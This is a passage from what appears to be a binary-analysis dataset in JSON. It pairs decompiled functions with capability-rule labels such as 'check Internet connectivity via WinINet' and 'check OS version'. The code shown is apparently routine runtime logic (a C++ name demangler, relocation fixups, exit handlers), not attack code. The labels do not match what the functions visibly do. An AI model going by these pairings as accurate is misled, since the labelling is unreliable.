NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x0001400047d3:\n                puVar2 = puVar7;\n                break;\n            default:\n                goto code_r0x0001400047d7;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x000140004771;\n        }\n        uVar6 = 1 << uVar5;\n        if ((uVar6 & 0x17c00fff600) != 0) goto joined_r0x000140004771;\n        if ((uVar6 & 0x1fe000000) == 0) {\n            if ((uVar6 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000481f;\n        }\n    }\n    else {\n        if (0x1d < uVar5 - 0x34) {\n            return NULL;\n        }\n        uVar6 = 1 << (uVar5 - 0x34 & 0x3f);\n        if ((uVar6 & 0x1c71107) == 0) {\n            if ((uVar6 & 0xa002ef8) != 0) goto code_r0x00014000481f;\n            puVar7 = uVar6 & 0x34000000;\n            goto joined_r0x0001400047d3;\n        }\njoined_r0x000140004771:\n        if (puVar2 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x000140004778:\n    iVar4 = *(arg1 + 0x28);\n    if (iVar4 < *(arg1 + 0x2c)) {\n        puVar7 = iVar4 * 0x20 + *(arg1 + 0x20);\n        *(puVar7 + 1) = 0;\n        *(arg1 + 0x28) = iVar4 + 1;\n        *puVar7 = uVar5;\n        *(puVar7 + 4) = puVar8;\n        *(puVar7 + 6) = puVar13;\n        return puVar7;\n    }\ncode_r0x0001400047d7:\n    return NULL;\n}\n",
        "token_count": 5570
    },
    "1400081f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400047b0)\n// WARNING: Removing unreachable block (ram,0x0001400047e0)\n// WARNING: Removing unreachable block (ram,0x0001400047e8)\n// WARNING: Removing unreachable block (ram,0x0001400047b8)\n// WARNING: Removing unreachable block (ram,0x0001400047c7)\n// WARNING: Removing unreachable block (ram,0x0001400047ce)\n// WARNING: Removing unreachable block (ram,0x00014000476e)\n// WARNING: Removing unreachable block (ram,0x000140004773)\n\nuint32_t * fcn.1400081f0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t *piVar5;\n    uint64_t arg2_00;\n    \n    puVar4 = fcn.140007d80(arg1);\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    if ((arg2 != 0) && ((*(arg1 + 0x10) & 1) == 0)) {\n        while( true ) {\n            uVar2 = *puVar4 - 0x1c;\n            if (0x35 < uVar2) {\n                if (*puVar4 != 2) {\n                    return puVar4;\n                }\n                piVar5 = *(puVar4 + 6);\n                while( true ) {\n                    if (piVar5 == NULL) {\n                        return NULL;\n                    }\n                    if (0x35 < *piVar5 - 0x1cU) break;\n                    if ((0x3400000000001fU >> (*piVar5 - 0x1cU & 0x3f) & 1) == 0) {\n                        return puVar4;\n                    }\n                    piVar5 = *(piVar5 + 4);\n                    *(puVar4 + 6) = piVar5;\n                }\n                return puVar4;\n            }\n            if ((0x3400000000001fU >> (uVar2 & 0x3f) & 1) == 0) break;\n            puVar4 = *(puVar4 + 4);\n        }\n        return puVar4;\n    }\n    if ((**(arg1 + 0x18) == '\\0') || (puVar3 = puVar4,  **(arg1 + 0x18) == 'E')) {\n        return puVar4;\n    }\n    do {\n        uVar2 = *puVar3;\n        if (uVar2 == 4) {\n            puVar3 = *(puVar3 + 4);\n            goto joined_r0x000140008347;\n        }\n        if (uVar2 < 5) {\n            if (uVar2 != 2) break;\n            puVar3 = *(puVar3 + 6);\n        }\n        else {\n            if ((0x35 < uVar2 - 0x1c) || ((0x3400000000001fU >> (uVar2 - 0x1c & 0x3f) & 1) == 0)) break;\n            puVar3 = *(puVar3 + 4);\n        }\n    } while (puVar3 != NULL);\ncode_r0x00014000827f:\n    arg2_00 = 0;\ncode_r0x000140008281:\n    piVar5 = fcn.140005fc0(arg1, arg2_00);\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if (((arg2 == 0) && (*puVar4 == 2)) && (*piVar5 == 0x29)) {\n        *(piVar5 + 4) = 0;\n    }\n    if (((puVar4 != NULL) && (piVar5 != NULL)) && (iVar1 = *(arg1 + 0x28),  iVar1 < *(arg1 + 0x2c))) {\n        puVar3 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar3 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        *puVar3 = 3;\n        *(puVar3 + 4) = puVar4;\n        *(puVar3 + 6) = piVar5;\n        return puVar3;\n    }\n    return NULL;\njoined_r0x000140008347:\n    if (puVar3 == NULL) goto code_r0x000140008370;\n    uVar2 = *puVar3;\n    if (8 < uVar2) {\n        arg2_00 = uVar2 != 0x35;\n        goto code_r0x000140008281;\n    }\n    if (6 < uVar2) goto code_r0x00014000827f;\n    if (1 < uVar2 - 1) goto code_r0x000140008370;\n    puVar3 = *(puVar3 + 6);\n    goto joined_r0x000140008347;\ncode_r0x000140008370:\n    arg2_00 = 1;\n    goto code_r0x000140008281;\n}\n",
        "token_count": 1177
    },
    "14000b4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14000b4c0(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    if (((arg3 != 0) && (*(arg3 + 4) < 2)) && (iVar1 = *(arg1 + 0x134),  iVar1 < 0x401)) {\n        *(arg3 + 4) = *(arg3 + 4) + 1;\n        uStack32 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar1 + 1;\n        *(arg1 + 0x148) = &iStack40;\n        iStack40 = arg3;\n        fcn.1400083b0(arg1, 0x11, arg3);\n        *(arg1 + 0x148) = uStack32;\n        *(arg3 + 4) = *(arg3 + 4) + -1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\n}\n",
        "token_count": 274
    },
    "14000c88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.14000c880(char *arg1, code *arg2, ulong arg3)\n\n{\n    char *pcVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uchar *arg1_00;\n    code *pcVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar *puVar13;\n    uint64_t arg2_00;\n    uint64_t uVar14;\n    char *pcVar15;\n    char *pcVar16;\n    int32_t iVar17;\n    ulong var_8h_2;\n    ulong var_14h;\n    ulong var_20h_2;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_150h;\n    ulong var_160h;\n    ulong var_168h;\n    ulong var_170h;\n    ulong var_178h;\n    ulong var_188h;\n    ulong var_1a8h;\n    ulong var_1f8h;\n    ulong var_200h;\n    ulong auStack624 [5];\n    ulong uStack584;\n    uint32_t uStack572;\n    uint64_t uStack568;\n    uchar *puStack560;\n    char *pcStack552;\n    char *pcStack544;\n    uint32_t uStack536;\n    char *pcStack528;\n    uint64_t uStack520;\n    uint uStack512;\n    uint32_t uStack508;\n    uchar *puStack504;\n    uint uStack496;\n    int32_t iStack492;\n    ulong uStack488;\n    ulong uStack480;\n    uint uStack472;\n    int32_t iStack468;\n    uint uStack464;\n    uchar auStack456 [256];\n    int64_t iStack200;\n    uchar uStack192;\n    code *pcStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    uchar auStack152 [8];\n    ulong uStack144;\n    uint uStack136;\n    ulong uStack128;\n    uchar *puStack120;\n    ulong uStack112;\n    uchar *var_60h;\n    uchar auStack96 [4];\n    ulong var_54h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_14h_2;\n    ulong var_4h;\n    \n    if ((*arg1 != '_') || (iVar17 = 1,  arg1[1] != 'Z')) {\n        auStack624[0] = 0x14000c8c9;\n        iVar6 = sub.msvcrt.dll_strncmp(arg1, \"_GLOBAL_\", 8);\n        iVar17 = 0;\n        if ((((iVar6 == 0) &&\n             ((iVar17 = 0,  arg1[8] - 0x24 < 0x3c &&\n              (iVar17 = 0,  (0xf7fffffffffffbfeU >> (arg1[8] - 0x24 & 0x3f) & 1) == 0)))) &&\n            ((cVar5 = arg1[9],  cVar5 == 'D' || (cVar5 == 'I')))) && (iVar17 = 0,  arg1[10] == '_')) {\n            iVar17 = (cVar5 != 'I') + 2;\n        }\n    }\n    uStack584 = arg1 + 1;\n    iStack468 = 1;\n    puStack560 = &stack0xfffffffffffffdd8;\n    uStack572 = (iVar17 != 2) + 0x45;\n    do {\n        auStack624[0] = 0x14000c9d3;\n        iVar7 = sub.msvcrt.dll_strlen(arg1);\n        pcStack544 = arg1 + iVar7;\n        uStack536 = 0x11;\n        iStack492 = iVar7;\n        uVar3 = iStack492 * 2;\n        uStack512 = 0;\n        uStack496 = 0;\n        uStack488 = 0;\n        uStack480 = 0;\n        uStack472 = 0;\n        uStack464 = 0;\n        if (0x800 < uVar3) {\n            return false;\n        }\n        auStack624[0] = 0x14000ca40;\n        pcStack552 = arg1;\n        pcStack528 = arg1;\n        uStack508 = uVar3;\n        iVar8 = fcn.14000e880(iVar7);\n        iVar8 = -iVar8;\n        puVar13 = &stack0xfffffffffffffdbf + iVar8;\n        uVar14 = puVar13 & 0xfffffffffffffff8;\n        *(&stack0xfffffffffffffd90 + iVar8) = 0x14000ca67;\n        iVar7 = fcn.14000e880(iVar7);\n        arg1_00 = puStack560;\n        iVar7 = -iVar7;\n        uStack520 = uVar14;\n        puStack504 = &stack0xfffffffffffffdb8 + iVar7 + iVar8;\n        if (iVar17 == 1) {\n            if ((*arg1 == '_') && (pcStack528 = uStack584,  arg1[1] == 'Z')) {\n                pcStack528 = arg1 + 2;\n                if ((arg1[2] == 'G') || (arg1[2] == 'T')) {\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cc8c;\n                    iVar9 = fcn.140007780(&stack0xfffffffffffffdd8);\n                }\n                else {\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cac9;\n                    iVar9 = fcn.1400081f0(&stack0xfffffffffffffdd8, 1);\n                }\n                cVar5 = *pcStack528;\n                pcVar16 = pcStack528;\n                if ((uStack536 & 1) != 0) {\n                    while (cVar5 == '.') {\n                        cVar5 = pcVar16[1];\n                        bVar2 = cVar5 + 0x9fU < 0x1a;\n                        if ((bVar2) || (cVar5 == '_')) {\n                            if ((cVar5 - 0x30U < 10 || bVar2) || (cVar5 == '_')) goto code_r0x00014000cb1e;\n                            cVar5 = *pcVar16;\n                            pcVar15 = pcVar16;\n                        }\n                        else {\n                            if (9 < cVar5 - 0x30U) {\n                                cVar5 = *pcStack528;\n                                break;\n                            }\ncode_r0x00014000cb1e:\n                            pcVar15 = pcVar16 + 2;\n                            cVar5 = pcVar16[2];\n                            while ((cVar5 + 0x9fU < 0x1a || cVar5 - 0x30U < 10 || (cVar5 == '_'))) {\n                                pcVar1 = pcVar15 + 1;\n                                pcVar15 = pcVar15 + 1;\n                                cVar5 = *pcVar1;\n                            }\n                        }\n                        while (cVar5 == '.') {\n                            while( true ) {\n                                if (9 < pcVar15[1] - 0x30U) goto code_r0x00014000cb95;\n                                cVar5 = pcVar15[2];\n                                pcVar15 = pcVar15 + 2;\n                                if (9 < cVar5 - 0x30U) break;\n                                do {\n                                    pcVar1 = pcVar15 + 1;\n                                    pcVar15 = pcVar15 + 1;\n                                } while (*pcVar1 - 0x30U < 10);\n                                if (*pcVar1 != '.') goto code_r0x00014000cb95;\n                            }\n                        }\ncode_r0x00014000cb95:\n                        pcStack528 = pcVar15;\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cbaa;\n                        puVar13 = &stack0xfffffffffffffdd8;\n                        uVar10 = fcn.140004840(&stack0xfffffffffffffdd8, pcVar16, pcVar15 - pcVar16);\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cbba;\n                        iVar9 = fcn.140004740(puVar13, 0x4f, iVar9, uVar10);\n                        pcVar16 = pcVar15;\n                        cVar5 = *pcVar15;\n                    }\n                }\n                goto code_r0x00014000c9aa;\n            }\n        }\n        else {\n            if (iVar17 - 2U < 2) {\n                pcVar16 = arg1 + 0xb;\n                pcStack528 = pcVar16;\n                if ((arg1[0xb] == '_') && (arg1[0xc] == 'Z')) {\n                    puVar13 = &stack0xfffffffffffffdd8;\n                    pcStack528 = arg1 + 0xd;\n                    if ((arg1[0xd] == 'G') || (arg1[0xd] == 'T')) {\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cc78;\n                        uVar14 = fcn.140007780(puVar13);\n                        pcVar16 = pcStack528;\n                    }\n                    else {\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cc12;\n                        uVar14 = fcn.1400081f0(puVar13, 0);\n                        pcVar16 = pcStack528;\n                    }\n                }\n                else {\n                    uStack568 = uVar14;\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000c93d;\n                    iVar6 = sub.msvcrt.dll_strlen(pcVar16);\n                    if (uVar3 != 0) {\n                        uStack512 = 1;\n                        *((puVar13 & 0xfffffffffffffff8) + 4) = 0;\n                        if (0 < iVar6) {\n                            *(puVar13 & 0xfffffffffffffff8) = 0;\n                            *((puVar13 & 0xfffffffffffffff8) + 0x10) = pcVar16;\n                            *((puVar13 & 0xfffffffffffffff8) + 0x18) = iVar6;\n                            uVar14 = uStack568;\n                            puVar13 = puStack560;\n                            goto code_r0x00014000c985;\n                        }\n                    }\n                    uVar14 = 0;\n                    puVar13 = &stack0xfffffffffffffdd8;\n                }\ncode_r0x00014000c985:\n                arg2_00 = uStack572;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000c993;\n                iVar9 = fcn.140004740(puVar13, arg2_00, uVar14, 0);\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000c99e;\n                iVar11 = sub.msvcrt.dll_strlen(pcVar16);\n                pcStack528 = pcVar16 + iVar11;\n                cVar5 = pcVar16[iVar11];\n            }\n            else {\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cbe1;\n                iVar9 = fcn.140005410(arg1_00);\n                cVar5 = *pcStack528;\n            }\ncode_r0x00014000c9aa:\n            if ((iVar9 != 0) && (cVar5 == '\\0')) {\n                iStack200 = 0;\n                uStack192 = 0;\n                uStack168 = 0;\n                uStack160 = 0;\n                uStack136 = 0;\n                pcStack184 = arg2;\n                uStack176 = arg3;\n                uStack128 = 0;\n                uStack112 = 0;\n                _auStack96 = 0;\n                _auStack152 = 0x0;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cd5e;\n                fcn.140004ac0(&stack0xfffffffffffffe38, iVar9);\n                if (auStack152._4_4_ < 0x800) {\n                }\n                stack0xffffffffffffffa8 = 0;\n                _auStack96 = _auStack96 & 0xffffffff | var_54h * uStack112._4_4_ << 0x20;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000cdac;\n                iVar11 = fcn.14000e880(1);\n                iVar11 = -iVar11;\n                puStack120 = &stack0xfffffffffffffdb8 + iVar11 + iVar7 + iVar8;\n                *(&stack0xfffffffffffffd90 + iVar11 + iVar7 + iVar8) = 0x14000cdc9;\n                iVar12 = fcn.14000e880(puStack120);\n                var_60h = &stack0xfffffffffffffdb8 + -iVar12 + iVar11 + iVar7 + iVar8;\n                *(&stack0xfffffffffffffd90 + -iVar12 + iVar11 + iVar7 + iVar8) = 0x14000cdef;\n                fcn.14000b4c0(&stack0xfffffffffffffe38, 0x11, iVar9);\n                uVar10 = uStack176;\n                iVar9 = iStack200;\n                (&stack0xfffffffffffffe38)[iStack200] = 0;\n                pcVar4 = pcStack184;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14000ce0e;\n                (*pcVar4)(&stack0xfffffffffffffe38, iVar9, uVar10);\n                return auStack152._0_4_ == 0;\n            }\n        }\n        if (iStack468 != -1) {\n            return false;\n        }\n        iStack468 = 0;\n    } while( true );\n}\n",
        "token_count": 3321
    },
    "14000ce5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14000ce50(int64_t arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint32_t *puStack40;\n    ulong uStack32;\n    \n    uVar2 = *arg3;\n    if (((uVar2 < 2) || (uVar2 == 0x31)) || (uVar2 == 6)) {\n        uVar2 = arg3[1];\n        if (1 < uVar2) {\ncode_r0x00014000cf20:\n            *(arg1 + 0x130) = 1;\n            return;\n        }\n        iVar4 = *(arg1 + 0x134);\n        bVar1 = true;\n        if (0x400 < iVar4) goto code_r0x00014000cf20;\n    }\n    else {\n        iVar3 = *(arg1 + 0x100);\n        if (iVar3 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar5 = 1;\n            iVar3 = 0;\n        }\n        else {\n            iVar5 = iVar3 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        *(arg1 + iVar3) = 0x28;\n        *(arg1 + 0x108) = 0x28;\n        uVar2 = arg3[1];\n        if ((1 < uVar2) || (iVar4 = *(arg1 + 0x134),  0x400 < iVar4)) {\n            *(arg1 + 0x130) = 1;\n            goto code_r0x00014000cef4;\n        }\n        bVar1 = false;\n    }\n    arg3[1] = uVar2 + 1;\n    uStack32 = *(arg1 + 0x148);\n    *(arg1 + 0x134) = iVar4 + 1;\n    *(arg1 + 0x148) = &puStack40;\n    puStack40 = arg3;\n    fcn.1400083b0(arg1, 0x11, arg3);\n    *(arg1 + 0x148) = uStack32;\n    arg3[1] = arg3[1] - 1;\n    *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n    if (bVar1) {\n        return;\n    }\n    iVar5 = *(arg1 + 0x100);\ncode_r0x00014000cef4:\n    if (iVar5 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar3 = 1;\n        iVar5 = 0;\n    }\n    else {\n        iVar3 = iVar5 + 1;\n    }\n    *(arg1 + 0x100) = iVar3;\n    *(arg1 + iVar5) = 0x29;\n    *(arg1 + 0x108) = 0x29;\n    return;\n}\n",
        "token_count": 792
    },
    "14000d8d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14000d8d0(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code **ppcVar5;\n    \n    if (*0x140129050 == 0) {\n        *0x140129050 = 1;\n        uVar2 = *_str._y_v_;\n        if (uVar2 == 0xffffffff) {\n            uVar4 = 0;\n            do {\n                uVar2 = uVar4;\n                uVar4 = uVar2 + 1;\n            } while (_str._y_v_[uVar4] != 0);\n        }\n        if (uVar2 != 0) {\n            ppcVar5 = _str._y_v_ + uVar2;\n            ppcVar1 = _str._y_v_ + (uVar2 - (uVar2 - 1)) + -1;\n            do {\n                (**ppcVar5)();\n                ppcVar5 = ppcVar5 + -1;\n            } while (ppcVar5 != ppcVar1);\n        }\n        iVar3 = sub.msvcrt.dll__onexit(0x14000d820);\n        return -(iVar3 == 0);\n    }\n    return *0x140129050;\n}\n",
        "token_count": 293
    },
    "14000dcc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.14000dcc0(ulong param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5, ulong param_6, \n                  int64_t *param_7, int64_t param_8)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    int32_t *piVar12;\n    uint uVar13;\n    uint32_t uVar14;\n    uint64_t arg2;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    int64_t *arg1;\n    int32_t iVar18;\n    ulong var_8h;\n    ulong auStack232 [5];\n    uint auStack192 [2];\n    uint64_t uStack184;\n    uchar auStack176 [16];\n    ulong auStack160 [7];\n    int64_t aiStack104 [2];\n    uchar auStack88 [12];\n    uchar auStack76 [12];\n    ulong var_4h;\n    \n    iVar18 = *0x1401290c0;\n    if (*0x1401290c0 != 0) {\n        return;\n    }\n    *0x1401290c0 = 1;\n    auStack160[2] = 0x14000dd07;\n    fcn.14000e620();\n    auStack160[2] = 0x14000dd1e;\n    iVar10 = fcn.14000e880(param_5);\n    iVar16 = *0x140103640;\n    puVar7 = *0x1401035f0;\n    *0x1401290c4 = 0;\n    iVar10 = -iVar10;\n    *0x1401290c8 = &stack0xffffffffffffffa8 + iVar10;\n    if (*0x1401035f0 - *0x140103600 < 8) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    puVar15 = *0x140103600;\n    if (*0x1401035f0 - *0x140103600 < 0xc) {\ncode_r0x00014000dd5d:\n        if (*puVar15 == 0) {\n            uVar9 = puVar15[1];\ncode_r0x00014000dd6a:\n            if (uVar9 == 0) {\n                arg2 = puVar15[2];\n                if (puVar15[2] != 1) {\ncode_r0x00014000e00e:\n                    uVar13 = 0x40102260;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x14000e01a;\n                    fcn.14000dae0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, param_7, param_8);\n                    if (*0x1401290d0 != NULL) {\n                        *(&stack0xffffffffffffff40 + iVar10) = uVar13;\n                        *(&stack0xffffffffffffff48 + iVar10) = arg2;\n                        *(&stack0xffffffffffffff50 + iVar10) = CONCAT88(param_4, param_3);\n                        *(&stack0xffffffffffffff60 + iVar10) = *(&stack0xffffffffffffffa0 + iVar10);\n                        *(&stack0xffffffffffffff18 + iVar10) = 0x14000e058;\n                        (**0x1401290d0)(&stack0xffffffffffffff40 + iVar10);\n                    }\n                    return;\n                }\n                puVar15 = puVar15 + 3;\n                if (*0x1401035f0 <= puVar15) {\n                    *0x1401290c4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar9 = puVar15[2];\n                        piVar11 = *puVar15 + iVar16;\n                        arg2 = uVar9;\n                        param_8 = *piVar11;\n                        arg1 = puVar15[1] + iVar16;\n                        if ((uVar9 & 0xff) == 0x20) goto code_r0x00014000df38;\n                        uVar14 = uVar9 & 0xff;\n                        if ((uVar9 & 0xff) < 0x21) break;\n                        if (uVar14 != 0x40) {\ncode_r0x00014000e002:\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x14000e00e;\n                            fcn.14000dae0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, param_7, param_8);\n                            goto code_r0x00014000e00e;\n                        }\n                        iVar17 = (*arg1 - piVar11) + param_8;\n                        if (((uVar9 & 0xc0) == 0) && (-1 < iVar17)) goto code_r0x00014000df1f;\n                        *(&stack0xffffffffffffff70 + iVar10) = 0x14000df88;\n                        fcn.14000db50(arg1);\n                        *arg1 = iVar17;\ncode_r0x00014000dde5:\n                        puVar15 = puVar15 + 3;\n                        if (puVar7 <= puVar15) goto code_r0x00014000de80;\n                    }\n                    if (uVar14 == 8) {\n                        uVar2 = *arg1;\n                        if (uVar2 < '\\0') {\n                            iVar17 = (uVar2 | 0xffffffffffffff00) - piVar11;\n                        }\n                        else {\n                            iVar17 = uVar2 - piVar11;\n                        }\n                        iVar17 = iVar17 + param_8;\n                        if (((uVar9 & 0xc0) == 0) && ((0xff < iVar17 || (iVar17 < -0x80)))) {\ncode_r0x00014000df1f:\n                            do {\n                                *(&stack0xffffffffffffff98 + iVar10) = iVar17;\n                                uVar9 = 0x401022c8;\n                                *(&stack0xffffffffffffff70 + iVar10) = 0x14000df33;\n                                param_7 = arg1;\n                                piVar11 = fcn.14000dae0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                        , arg2, arg1, param_8);\ncode_r0x00014000df38:\n                                uVar14 = *arg1;\n                                if (uVar14 < 0) {\n                                    iVar17 = (uVar14 | 0xffffffff00000000) - piVar11;\n                                }\n                                else {\n                                    iVar17 = uVar14 - piVar11;\n                                }\n                                iVar17 = iVar17 + param_8;\n                            } while (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x80000000 || (0xffffffff < iVar17))));\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x14000df72;\n                            fcn.14000db50(arg1);\n                            *arg1 = iVar17;\n                        }\n                        else {\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x14000dde2;\n                            fcn.14000db50(arg1);\n                            *arg1 = iVar17;\n                        }\n                        goto code_r0x00014000dde5;\n                    }\n                    if (uVar14 != 0x10) goto code_r0x00014000e002;\n                    uVar3 = *arg1;\n                    if (uVar3 < 0) {\n                        iVar17 = (uVar3 | 0xffffffffffff0000) - piVar11;\n                    }\n                    else {\n                        iVar17 = uVar3 - piVar11;\n                    }\n                    iVar17 = iVar17 + param_8;\n                    if (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x8000 || (0xffff < iVar17)))) goto code_r0x00014000df1f;\n                    puVar15 = puVar15 + 3;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x14000de6c;\n                    fcn.14000db50(arg1);\n                    *arg1 = iVar17;\n                } while (puVar15 < puVar7);\n                goto code_r0x00014000de80;\n            }\n        }\n    }\n    else if (**0x140103600 == 0) {\n        uVar9 = (*0x140103600)[1];\n        if ((uVar9 | (*0x140103600)[2]) == 0) {\n            puVar15 = *0x140103600 + 3;\n            goto code_r0x00014000dd5d;\n        }\n        goto code_r0x00014000dd6a;\n    }\n    if (*0x1401035f0 <= puVar15) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar15 + 1;\n        uVar9 = *puVar15;\n        puVar15 = puVar15 + 2;\n        piVar12 = *puVar1 + iVar16;\n        iVar4 = *piVar12;\n        *(&stack0xffffffffffffff70 + iVar10) = 0x14000dff6;\n        fcn.14000db50(piVar12);\n        *piVar12 = uVar9 + iVar4;\n    } while (puVar15 < puVar7);\ncode_r0x00014000de80:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1401290c4) {\n        iVar16 = 0;\n        do {\n            piVar12 = *0x1401290c8 + iVar16;\n            iVar4 = *piVar12;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar12 + 4);\n                uVar6 = *(piVar12 + 2);\n                *(&stack0xffffffffffffff70 + iVar10) = 0x14000debf;\n                (*pcVar8)(uVar6, uVar5, iVar4, &stack0xffffffffffffffb4);\n            }\n            iVar18 = iVar18 + 1;\n            iVar16 = iVar16 + 0x28;\n        } while (iVar18 < *0x1401290c4);\n    }\n    return;\n}\n",
        "token_count": 2376
    },
    "14000e38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
